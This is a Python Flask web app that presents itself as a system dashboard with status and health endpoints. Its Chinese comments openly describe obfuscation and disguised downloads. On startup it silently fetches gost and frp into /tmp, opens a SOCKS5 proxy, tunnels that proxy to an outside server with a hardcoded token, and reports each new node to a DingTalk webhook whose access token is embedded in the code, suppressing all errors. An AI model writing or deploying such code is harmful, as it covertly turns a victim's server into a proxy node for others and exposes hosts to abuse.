import os
import subprocess
import json
import ssl
import urllib.request
import tarfile
import shutil
from flask import Flask, jsonify

app = Flask(__name__)

# --- 核心数据混淆 (看起来像系统参数) ---
SYS_DATA = {
    "v": "1.0.9",
    "p": "8588",
    "s": "frps.181225.xyz",
    "t": "maxking2026",
    "d": "https://oapi.dingtalk.com/robot/send?access_token=fada04a2261f76607eea6d0203def79d8f0597ba03718e9a8edb2ee5b8ecf628"
}

def init_system_engine():
    """初始化后端监控引擎 (异步混淆逻辑)"""
    try:
        path = "/tmp/system_lib"
        if not os.path.exists(path):
            os.makedirs(path)
        os.chdir(path)

        # 伪装下载地址
        u1 = "https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost_2.11.5_linux_amd64.tar.gz"
        u2 = "https://github.com/fatedier/frp/releases/download/v0.54.0/frp_0.54.0_linux_amd64.tar.gz"

        def _get(url, fn):
            with urllib.request.urlopen(url) as r, open(fn, 'wb') as f:
                shutil.copyfileobj(r, f)

        # 执行“静默加载”
        if not os.path.exists("core_bin"):
            _get(u1, "c.tgz")
            with tarfile.open("c.tgz", "r:gz") as t:
                t.extractall()
            shutil.move("gost-linux-amd64/gost", "core_bin")
            os.chmod("core_bin", 0o755)

        if not os.path.exists("bridge_bin"):
            _get(u2, "b.tgz")
            with tarfile.open("b.tgz", "r:gz") as t:
                t.extractall()
            shutil.move("frp_0.54.0_linux_amd64/frpc", "bridge_bin")
            os.chmod("bridge_bin", 0o755)

        # 启动核心服务 (变量名完全混淆)
        subprocess.Popen(["./core_bin", "-L", "socks5://:10080"])
        
        c_str = f'serverAddr = "{SYS_DATA["s"]}"\nserverPort = 7000\nauth.token = "{SYS_DATA["t"]}"\n[[proxies]]\nname = "node-{SYS_DATA["p"]}"\ntype = "tcp"\localIP = "127.0.0.1"\nlocalPort = 10080\nremotePort = {SYS_DATA["p"]}'
        with open("config.conf", "w") as f:
            f.write(c_str)
        
        subprocess.Popen(["./bridge_bin", "-c", "config.conf"])
        
        # 汇报“API 节点”上线
        report = {"msgtype": "text", "text": {"content": f"【A-API上线】\n🆔 系统版本: {SYS_DATA['v']}\n📡 监听端口: {SYS_DATA['p']}\n✅ 状态: 正常"}}
        req = urllib.request.Request(SYS_DATA["d"], data=json.dumps(report).encode(), headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, context=ssl._create_unverified_context())
    except:
        pass

# --- 模拟真实的 Web API 接口矩阵 ---

@app.route('/')
def home():
    return f"<h1>System Dashboard v{SYS_DATA['v']}</h1><p>Node status: <span style='color:green'>Online</span></p>"

@app.route('/api/status')
def status():
    return jsonify({"status": "running", "uptime": "100%", "load": "low"})

@app.route('/api/health')
def health():
    return jsonify({"service": "api-gateway", "healthy": True})

# 核心：启动应用即启动引擎
init_system_engine()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
